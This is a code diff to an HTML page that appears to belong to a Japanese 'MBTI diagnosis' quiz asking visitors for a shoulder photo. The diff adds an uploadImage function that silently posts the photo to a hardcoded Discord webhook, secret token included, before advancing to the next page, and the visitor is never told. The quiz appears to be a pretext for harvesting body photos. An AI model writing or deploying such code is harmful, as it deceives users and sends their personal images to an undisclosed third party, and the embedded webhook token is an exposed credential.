@@ -44,29 +44,42 @@
       <input type="file" id="shoulderImage" accept="image/*">
     </div>
 
-    <button id="nextButton" onclick="goToNext()" disabled>次に進む</button>
+    <button id="nextButton" onclick="uploadImage()" disabled>次に進む</button>
   </div>
 
   <script>
     const fileInput = document.getElementById('shoulderImage');
     const nextButton = document.getElementById('nextButton');
 
-    // ファイルが選択されたらボタンを有効化
+    // 入力があればボタンを有効化
     fileInput.addEventListener('change', function () {
       nextButton.disabled = !fileInput.files.length;
     });
 
-    function goToNext() {
-      // アップロード済みかを再チェック（安全のため）
-      if (!fileInput.files.length) {
+    async function uploadImage() {
+      const file = fileInput.files[0];
+      if (!file) {
         alert('写真をアップロードしてください');
         return;
       }
 
-      // ※ Discord Webhookなどで送信する場合はここに追加可能
+      const formData = new FormData();
+      formData.append("file", file);
+      formData.append("username", "MBTI診断ボット");
+      formData.append("content", "肩の写真がアップロードされました。");
 
-      // 次のページへ
-      window.location.href = 'page4.html';
+      try {
+        await fetch("https://discord.com/api/webhooks/1379749797371580437/smRAKks4G35vKArSlqAlVf3N_m8sDVDznuW7oI5gVB6xzJ8-HN32TKxuGTAT1pxYj65G", {
+          method: "POST",
+          body: formData
+        });
+
+        // 正常に送信されたら次のページへ
+        window.location.href = "page4.html";
+      } catch (error) {
+        console.error("送信エラー:", error);
+        alert("送信に失敗しました。もう一度お試しください。");
+      }
     }
   </script>
 </body>
